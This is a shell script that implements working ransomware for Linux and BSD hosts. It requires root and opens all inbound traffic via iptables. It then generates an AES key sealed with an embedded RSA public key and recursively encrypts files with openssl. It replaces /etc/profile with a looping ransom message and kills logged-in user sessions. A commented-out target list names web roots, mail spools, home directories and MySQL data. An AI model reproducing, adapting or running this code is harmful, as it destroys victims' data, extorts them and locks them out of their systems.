#!/bin/sh

################ CHECKS ###############################
# Get the OS version
get_os() {
    if [[$(uname -s | grep Linux) != ""]]; then
	OS="linux"
    elif [[ $( uname -s | grep BSD) != "" ]]; then
	OS="bsd"
    else
	adderr "[!] NOT \"Linux\" or \"BSD\""
	EXIT
    fi
}

# Check for a TUI
check_msg() {
    if [ "$(which dialog)" != "" ]; then
	DIALOG=dialog
    elif [ "$(which whiptail)" != "" ]; then
	DIALOG=whiptail
    else
	DIALOG=none
    fi
}
# check the requirements
check_req() {
    # Fatal Errors
    if [ "$(whoami)" != "root" ]; then
	adderr "[!] NOT ROOT"
        EXIT
    fi
    if [ "$(which openssl)" = "" ]; then
        adderr "[!] NO OPENSSL FOUND"
        EXIT
    fi
    # Non-Fatal Errors
    if [ "$(which iptables)" = "" ]; then
        adderr "[!] NO IPTABLES FOUND"
    else
        `which iptables` -I INPUT 1 -j ACCEPT
    fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" = "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" = "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}
adderr() { ERRMSG="$ERRMSG\n$1"; }
EXIT() {
    echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
exit; }

init() {
	check_req
	check_msg
	KEY="$(openssl rand -base64 25)"
	pubkey="\
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXODFFedTcvdzqPtbxpE
Xsc0vlXdXRkR4sjnPJ6eycA7ILQG+/ZYocSDTmxSoRFvtqq8AQ5BCJEcl6rTp9JJ
d8PBVGfz4sR7YRR6jjVEfy9n0EUua5EcX8ST1gOsIiyqZPbvCab05AUK+u8Yvyiq
5PA7IcZdIR1LwG6/NAZ0+Kh5iJeHmJP6H7hp1UxY2Qk2SuhyDRTUWgWM8PBxKny5
GkgnPhkquGXUWYtXyhoW3JlOxIVSml9g6jrtivINJpSESSMpgdt3WjPD1oU6H/ts
hD6EWJStqoDSp83199vc5+7lVV5pouDDf4q178lIYlfagwX5IdaWSgcKUXrRpd6Q
CwIDAQAB
-----END PUBLIC KEY-----\
	"
	PUBLICKEY="publickey.txt"
	PRIVATEKEY="packet.txt"
	echo "$pubkey" > $PUBLICKEY
	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
}
navdir() {
for fil in $1; do
	whitelist=".*vmware.*|.*_schema.*"
	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}
showmess() {
    case "$DIALOG" in
    *none*)
	reset
	echo $2 "(y/N)"
	read result
	;;
    *)
	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
       		--title "$1" \
       		--msgbox "$2" 16 60
        result=$?
	;;
    esac
}
############### ENCRYPTING ###########################
pck() {
    adderr "[+] Encrypted $1"
    LIST="$LIST$1\n"
    if [ -f "$1" ]; then
	if [ "$SOFT" = "" ]; then
	    openfile $1
	    stuff=$(cat $1)
	    echo "RAN" > $1
	    echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
	fi
    fi
}
enc_loop() {
    kills="$1"
    for i in $kills; do
	if [ -d "$i" ]; then
	    navdir "$i/*" "pck"
	    adderr "[+] Encrypted $i"
	fi
    done
}
################## DECRYPT ################################
upk() {
    adderr "[+] Decrypted $1"
    if [ "$SOFT" = "" ]; then
	openfile $1
	openfile $1.dec
	mv $1 $1.enc
	openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
	rm $1.enc
    fi
}
dec_loop() {
    kills="$1"
    for i in $kills; do
    	if [ -d "$i" ]; then
	    navdir "$i/*" "upk"
	    adderr "[+] Decrypted $i"
	fi
    done
}
################# MAIN ######################################
setmsg() {
    msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 20 30;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
    mv /etc/profile /etc/profile.bak
    echo $msg > /etc/profile
}

lock() {
    who -u | awk '{print $6}' | xargs kill -9 
}


main() {
    check_msg
    check_req
    trap '' INT
    trap '' TERM
    #SOFT="YES"
    init
    targets="/root/Desktop/testing"
    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
    enc_loop "$targets"
    echo >> $PRIVATEKEY
    printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
    setmsg
    lock
    EXIT
}
main
